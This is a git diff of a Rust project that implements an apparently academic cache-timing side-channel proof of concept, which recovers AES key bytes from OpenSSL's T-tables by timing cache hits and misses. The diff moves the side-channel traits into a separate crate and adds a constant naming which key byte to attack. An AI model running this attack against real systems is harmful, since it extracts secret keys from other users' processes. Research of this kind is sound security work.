@@ -1,21 +1,21 @@
-#![feature(specialization)]
+//#![feature(specialization)]
 #![feature(unsafe_block_in_unsafe_fn)]
 #![deny(unsafe_op_in_unsafe_fn)]
 
 use openssl::aes;
 
 use crate::CacheStatus::Miss;
+use cache_side_channel::table_side_channel::TableCacheSideChannel;
+use cache_side_channel::CacheStatus;
 use memmap2::Mmap;
 use openssl::aes::aes_ige;
 use openssl::symm::Mode;
 use rand::seq::SliceRandom;
 use rand::thread_rng;
 use std::collections::HashMap;
-use std::fmt::Debug;
 use std::fs::File;
 use std::path::Path;
 
-pub mod naive_flush_and_reload;
 // Generic AES T-table attack flow
 
 // Modularisation :
@@ -37,322 +37,10 @@ pub mod naive_flush_and_reload;
 
 // an attacker measurement
 // a calibration victim
-#[derive(Debug, PartialEq, Eq, Clone, Copy)]
-pub enum CacheStatus {
-    Hit,
-    Miss,
-}
-
-#[derive(Debug, PartialEq, Eq, Clone, Copy)]
-pub enum ChannelFatalError {
-    Oops,
-}
-
-pub enum SideChannelError {
-    NeedRecalibration,
-    FatalError(ChannelFatalError),
-    AddressNotReady(*const u8),
-    AddressNotCalibrated(*const u8),
-}
-
-/*
-pub enum CacheSideChannel {
-    SingleAddr,
-    MultipleAddr,
-}
-*/
 
 // Access Driven
 
-pub trait SimpleCacheSideChannel {
-    // TODO
-}
-
-pub struct TableAttackResult {
-    pub addr: *const u8,
-    hit: u32,
-    miss: u32,
-}
-
-impl TableAttackResult {
-    fn get(&self, cache_status: CacheStatus) -> u32 {
-        match cache_status {
-            CacheStatus::Hit => self.hit,
-            CacheStatus::Miss => self.miss,
-        }
-    }
-}
-
-pub trait TableCacheSideChannel {
-    //type ChannelFatalError: Debug;
-    /// # Safety
-    ///
-    /// addresses must contain only valid pointers to read.
-    unsafe fn calibrate(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
-    ) -> Result<(), ChannelFatalError>;
-    /// # Safety
-    ///
-    /// addresses must contain only valid pointers to read.
-    unsafe fn attack<'a, 'b, 'c>(
-        &'a mut self,
-        addresses: impl Iterator<Item = &'c *const u8> + Clone,
-        victim: &'b dyn Fn(),
-        num_iteration: u32,
-    ) -> Result<Vec<TableAttackResult>, ChannelFatalError>;
-}
-
-pub trait SingleAddrCacheSideChannel: Debug {
-    //type SingleChannelFatalError: Debug;
-    /// # Safety
-    ///
-    /// addr must be a valid pointer to read.
-    unsafe fn test_single(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError>;
-    /// # Safety
-    ///
-    /// addr must be a valid pointer to read.
-    unsafe fn prepare_single(&mut self, addr: *const u8) -> Result<(), SideChannelError>;
-    fn victim_single(&mut self, operation: &dyn Fn());
-    /// # Safety
-    ///
-    /// addresses must contain only valid pointers to read.
-    unsafe fn calibrate_single(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
-    ) -> Result<(), ChannelFatalError>;
-}
-
-pub trait MultipleAddrCacheSideChannel: Debug {
-    const MAX_ADDR: u32;
-    /// # Safety
-    ///
-    /// addresses must contain only valid pointers to read.
-    unsafe fn test<'a, 'b, 'c>(
-        &'a mut self,
-        addresses: &'b mut (impl Iterator<Item = &'c *const u8> + Clone),
-    ) -> Result<Vec<(*const u8, CacheStatus)>, SideChannelError>;
-
-    /// # Safety
-    ///
-    /// addresses must contain only valid pointers to read.
-    unsafe fn prepare<'a, 'b, 'c>(
-        &'a mut self,
-        addresses: &'b mut (impl Iterator<Item = &'c *const u8> + Clone),
-    ) -> Result<(), SideChannelError>;
-    fn victim(&mut self, operation: &dyn Fn());
-
-    /// # Safety
-    ///
-    /// addresses must contain only valid pointers to read.
-    unsafe fn calibrate(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
-    ) -> Result<(), ChannelFatalError>;
-}
-
-impl<T: SingleAddrCacheSideChannel> TableCacheSideChannel for T {
-    default unsafe fn calibrate(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
-    ) -> Result<(), ChannelFatalError> {
-        unsafe { self.calibrate_single(addresses) }
-    }
-    //type ChannelFatalError = T::SingleChannelFatalError;
-
-    default unsafe fn attack<'a, 'b, 'c>(
-        &'a mut self,
-        addresses: impl Iterator<Item = &'c *const u8> + Clone,
-        victim: &'b dyn Fn(),
-        num_iteration: u32,
-    ) -> Result<Vec<TableAttackResult>, ChannelFatalError> {
-        let mut result = Vec::new();
-
-        for addr in addresses {
-            let mut hit = 0;
-            let mut miss = 0;
-            for iteration in 0..100 {
-                match unsafe { self.prepare_single(*addr) } {
-                    Ok(_) => {}
-                    Err(e) => match e {
-                        SideChannelError::NeedRecalibration => unimplemented!(),
-                        SideChannelError::FatalError(e) => return Err(e),
-                        SideChannelError::AddressNotReady(_addr) => panic!(),
-                        SideChannelError::AddressNotCalibrated(_addr) => unimplemented!(),
-                    },
-                }
-                self.victim_single(victim);
-                let r = unsafe { self.test_single(*addr) };
-                match r {
-                    Ok(status) => {}
-                    Err(e) => match e {
-                        SideChannelError::NeedRecalibration => panic!(),
-                        SideChannelError::FatalError(e) => {
-                            return Err(e);
-                        }
-                        _ => panic!(),
-                    },
-                }
-            }
-            for _iteration in 0..num_iteration {
-                match unsafe { self.prepare_single(*addr) } {
-                    Ok(_) => {}
-                    Err(e) => match e {
-                        SideChannelError::NeedRecalibration => unimplemented!(),
-                        SideChannelError::FatalError(e) => return Err(e),
-                        SideChannelError::AddressNotReady(_addr) => panic!(),
-                        SideChannelError::AddressNotCalibrated(_addr) => unimplemented!(),
-                    },
-                }
-                self.victim_single(victim);
-                let r = unsafe { self.test_single(*addr) };
-                match r {
-                    Ok(status) => match status {
-                        CacheStatus::Hit => {
-                            hit += 1;
-                        }
-                        CacheStatus::Miss => {
-                            miss += 1;
-                        }
-                    },
-                    Err(e) => match e {
-                        SideChannelError::NeedRecalibration => panic!(),
-                        SideChannelError::FatalError(e) => {
-                            return Err(e);
-                        }
-                        _ => panic!(),
-                    },
-                }
-            }
-            result.push(TableAttackResult {
-                addr: *addr,
-                hit,
-                miss,
-            });
-        }
-        Ok(result)
-    }
-}
-
 // TODO
-
-impl<T: MultipleAddrCacheSideChannel> SingleAddrCacheSideChannel for T {
-    unsafe fn test_single(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError> {
-        let addresses = vec![addr];
-        unsafe { self.test(&mut addresses.iter()) }.map(|v| v[0].1)
-    }
-
-    unsafe fn prepare_single(&mut self, addr: *const u8) -> Result<(), SideChannelError> {
-        let addresses = vec![addr];
-        unsafe { self.prepare(&mut addresses.iter()) }
-    }
-
-    fn victim_single(&mut self, operation: &dyn Fn()) {
-        self.victim(operation);
-    }
-
-    unsafe fn calibrate_single(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
-    ) -> Result<(), ChannelFatalError> {
-        unsafe { self.calibrate(addresses) }
-    }
-}
-
-// TODO limit number of simultaneous tested address + randomise order ?
-
-impl<T: MultipleAddrCacheSideChannel> TableCacheSideChannel for T {
-    unsafe fn calibrate(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
-    ) -> Result<(), ChannelFatalError> {
-        unsafe { self.calibrate(addresses) }
-    }
-    //type ChannelFatalError = T::MultipleChannelFatalError;
-
-    /// # Safety
-    ///
-    /// addresses must contain only valid pointers to read.
-    unsafe fn attack<'a, 'b, 'c>(
-        &'a mut self,
-        mut addresses: impl Iterator<Item = &'c *const u8> + Clone,
-        victim: &'b dyn Fn(),
-        num_iteration: u32,
-    ) -> Result<Vec<TableAttackResult>, ChannelFatalError> {
-        let mut v = Vec::new();
-        while let Some(addr) = addresses.next() {
-            let mut batch = Vec::new();
-            batch.push(*addr);
-            let mut hits: HashMap<*const u8, u32> = HashMap::new();
-            let mut misses: HashMap<*const u8, u32> = HashMap::new();
-            for i in 1..T::MAX_ADDR {
-                if let Some(addr) = addresses.next() {
-                    batch.push(*addr);
-                } else {
-                    break;
-                }
-            }
-            for i in 0..100 {
-                // TODO Warmup
-            }
-            for i in 0..num_iteration {
-                match unsafe { MultipleAddrCacheSideChannel::prepare(self, &mut batch.iter()) } {
-                    Ok(_) => {}
-                    Err(e) => match e {
-                        SideChannelError::NeedRecalibration => unimplemented!(),
-                        SideChannelError::FatalError(e) => return Err(e),
-                        SideChannelError::AddressNotReady(_addr) => panic!(),
-                        SideChannelError::AddressNotCalibrated(addr) => {
-                            eprintln!(
-                                "Addr: {:p}\n\
-                            {:#?}",
-                                addr, self
-                            );
-                            unimplemented!()
-                        }
-                    },
-                }
-                MultipleAddrCacheSideChannel::victim(self, victim);
-
-                let r = unsafe { MultipleAddrCacheSideChannel::test(self, &mut batch.iter()) }; // Fixme error handling
-                match r {
-                    Err(e) => match e {
-                        SideChannelError::NeedRecalibration => {
-                            panic!();
-                        }
-                        SideChannelError::FatalError(e) => {
-                            return Err(e);
-                        }
-                        _ => {
-                            panic!();
-                        }
-                    },
-                    Ok(vector) => {
-                        for (addr, status) in vector {
-                            match status {
-                                CacheStatus::Hit => {
-                                    *hits.entry(addr).or_default() += 1;
-                                }
-                                CacheStatus::Miss => {
-                                    *misses.entry(addr).or_default() += 1;
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-
-            for addr in batch {
-                v.push(TableAttackResult {
-                    addr,
-                    hit: *hits.get(&addr).unwrap_or(&0u32),
-                    miss: *misses.get(&addr).unwrap_or(&0u32),
-                })
-            }
-        }
-        Ok(v)
-    }
-}
 
 pub struct AESTTableParams<'a> {
     pub num_encryptions: u32,
@@ -360,6 +48,8 @@ pub struct AESTTableParams<'a> {
     pub openssl_path: &'a Path,
     pub te: [isize; 4],
 }
+
+const KEY_BYTE_TO_ATTACK: usize = 0;
 
 /// # Safety
 ///
@@ -382,9 +72,6 @@ pub unsafe fn attack_t_tables_poc(
     }
 
     let key_struct = aes::AesKey::new_encrypt(&parameters.key).unwrap();
-
-    //let mut plaintext = [0u8; 16];
-    //let mut result = [0u8; 16];
 
     let mut timings: HashMap<*const u8, HashMap<u8, u32>> = HashMap::new();
 
@@ -409,13 +96,12 @@ pub unsafe fn attack_t_tables_poc(
     }
 
     for b in (u8::min_value()..=u8::max_value()).step_by(16) {
-        //plaintext[0] = b;
         eprintln!("Probing with b = {:x}", b);
         // fixme magic numbers
 
         let victim = || {
             let mut plaintext = [0u8; 16];
-            plaintext[0] = b;
+            plaintext[KEY_BYTE_TO_ATTACK] = b;
             for byte in plaintext.iter_mut().skip(1) {
                 *byte = rand::random();
             }
